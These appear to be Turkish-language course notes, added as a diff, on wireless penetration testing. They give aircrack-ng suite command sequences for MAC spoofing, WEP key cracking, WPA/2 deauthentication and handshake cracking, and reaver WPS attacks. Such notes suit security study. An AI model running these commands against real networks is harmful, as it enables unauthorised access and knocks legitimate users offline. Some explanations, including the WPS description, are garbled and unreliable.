@@ -1,0 +1,106 @@
+---Wireless Network Attacks: 
+
+-Kablosuz ağ sinyalleri eskiden herkese açık bir şekilde yayınlandığı için (radyo gibi) herkes tarafından takip edilebiliyordu.
+
+-Öneri: Tp-Link WN722N, Alpha Chipset (051, 036), Kali Linux Wireless Pen. Testing (Kitap önerisi)
+
+-BSSID: Erişim noktasının (Access Point) MAC adresi.
+
+-ESSID: Erişim noktasının ismi.
+
+=> ifconfig
+=> airmon-ng check kill (bize engel olabilecek servisleri kapatır)
+=> airmon-ng start wlan0(wireless destekli kartlarımızı monitör modda kullanabilmemizi sağlayan araç)
+=> airodump-ng wlan0mon (monitör moddaki sistemlerin yakaladığı bilgileri ekrana aktarır)
+-CH: Radyo mantığı; nasıl aynı anda birden fazla kanalı dinleyemiyorsak, wireless'da da 13 kanaldan birini aracın kanallar arası zap yapmasıyla dinleriz.
+-Elapsed: Geçen süre.
+-Airodump menüsü iki bölüme ayrılır. İlk bölüm AP(erişim noktaları) ile alakalı olan bölümdür. İkinci bölüm erişim noktalarıyla alakalı istemciler ile ilgili olan bölümdür.
+-PWD: Erişim noktasının sinyal gücü hakkında bilgi verir. - değer alır, değer yüksekse erişim daha güçlüdür.
+
+-Wireless "full duplex" teknolojisini hala desteklememektedir. (Aynı anda hem veri yollayıp veri alma)
+
+-Beacons: Wireless'daki kontrol paketlerinin sayısını belirten kısım.
+-Data: Bilgi alış-verişinin yapıldığı paket sayısı.
+-MB: (?)
+-ENC: Kullanılan şifreleme hakkında bilgi verir.
+-CIPHER: Kullanılan şifrelemenin kullandığı algoritma bilgisini verir.
+-ATH: Doğrulama için kullanılan protokolün bilgisini verir.
+
+-ifconfig wlp2s0:1 192.168.0.2 (sanal bir IP interface'i oluşturur)
+-ifconfig wlp2s0:1 down (sanal interface'i kaldırır)
+
+-İkinci kısım: BSSID (Erişim noktalarının MAC adresleri, eğer bu alan boşsa client sadece tarama yapıyor demektir).
+-STATION: Erişim noktasına bağlanan makinelerin MAC adresleri.
+-Rate: 
+-Lost: Kayıp paketler.
+-Frame: Gelen paketler.
+-Probe: ESSID değeri alır, daha önceden bağlanmış olduğu erişim noktaları varsa onları civarda tekrar aratmak için kullanır.
+
+-Eğer ESSID gizlenirse sadece kablosuz yayının ismini bilen kişiler bu kablosuz ağa bağlanabilir. (Probe işlemi)
+
+=> iwconfig wlp2s0 essid "Lyk-2016" (Interface ile erişim noktalarını birbirine bağlar(?))
+=> dhclient wlp2s0
+
+=> airodump-ng wlan0mon -c 1 --bssid C0:4A:00:E9:08:2C (filtreleme)
+
+-ESSID'i gözükmeyen <length: 0> bağlantıları izlemeye alırsak, o ağa biri tekrar bağlandığı zaman ESSID'ini öğrenebiliriz.
+
+-MAC Filtreleme: Sadece kaydedilen MAC adreslerine bağlantı izni verir veya bağlantıya kabul etmez.
+
+-MAC filtrelemeyi atlatma: Ağa bağlı bir MAC adresini alıp kendi MAC adresi olarak gösterir.
+
+=> ifconfig interface down
+=> ifconfig interface hw ether hedef-MAC (airodump'dan buluyoruz)
+=> ifconfig interface up
+
+-Eski haline döndürmek için:
+=> ifconfig interface down
+=> ifconfig interface hw ether kendi-MAC-adresimiz
+=> ifconfig interface up
+
+---Wireshark raporu için:
+
+=> airodump-ng wlan0mon -c 6 --bssid C0:4A:00:E9:08:2C -w isim.pcap (Yayın yakalarsa isim.pcap içerisine kaydeder.) 
+
+-FİLM Önerisi: Enigma
+
+-WEP: IV (Initation vector)Başlığa açık olarak yerleştirilir. Açık olan değerle şifreli değeri kıyaslayarak anahtarı bulmaya çalışıyoruz. WEP'te anahtara ihtiyaç olmadan oturum kurma imkanı vardır. Bu zafiyet bize paket enjeksiyonu yapma imkanı verir.
+
+-WEP Şifresi Kırma Örneği:
+
+=> airmon-ng start wlan0
+=> airodump-ng wlan0mon
+=> airodump-ng wlan0mon --bssid C0:4A:00:E9:08:2C -c 1 -w lyk201wep
+=> (Yeni terminal) aireplay-ng --fakeauth 1 -a C0:4A:00:E9:08:2C wlan0mon (paket enjekte etmemizi sağlayan araç)
+=> aireplay-ng --arpreplay -b C0:4A:00:E9:08:2C wlan0mon (paket enjekte eder)
+=> (64bit için = DATA 5.000, 128bit için = DATA 35.000-40.000) aircrack-ng lyk2016.cap (KEY FOUND!)
+
+-WPA/2: Four-way handshake'e dayanır. Brute-force'a açık. Ağa bağlı bir istemci yoksa kırılamaz.
+
+=> Yukarıdaki işlemleri tekrar et. Ön koşullar: bir istemcinin WPA/2 ağındaki oturumunu baştan sona kaydetmek. Bağlı istemcileri düşürüp tekrar bağlanmasını sağlayarak veya istemcinin bağlanmasını bekleyerek yapılabilir.
+
+-İstemciyi düşürme:
+
+=> aireplay-ng --deauth 0 -a BSSID -c STATION wlan0mon
+=> airodump-ng wlan0mon --bssid C0:4A:00:E9:08:2C -c 6 -w lyk201wpa2 (6.kanala geçmiş)
+=> aircrack-ng lyk2016wpa4-01.cap -w /usr/share/wordlists/
+=> vi /tmp/sozluk.txt
+=> aircrack-ng lyk2016wpa4-01.cap -w /tmp/sozluk.txt
+
+---Brute Force:
+
+=> john --incremental --stdout | aircrack-ng lyk2016wpa4-01.cap -b BSSID -w -
+
+---Wireshark filter: wlan 
+-Edit
+-Preferences
+-Protocols
+-ieee 802.11
+-Decryption Keys: Edit 
+-wpa-pwd
+-pass:essid
+
+---WPS: 8 bitlik doğruluma kullanılır. 10^7 (1 bit tahminle yaklaşık 8 saatte çözülebilir. İki parça şeklinde, 4 + 3 gönderiliyor. İlk 4'lük doğruysa geri kalan 3 yollanır.
+
+=> wash -i wlan0mon -wps'li AP'leri bulur
+=> reaver -i wlan0mon -b BSSID -vv (-p <pin>)
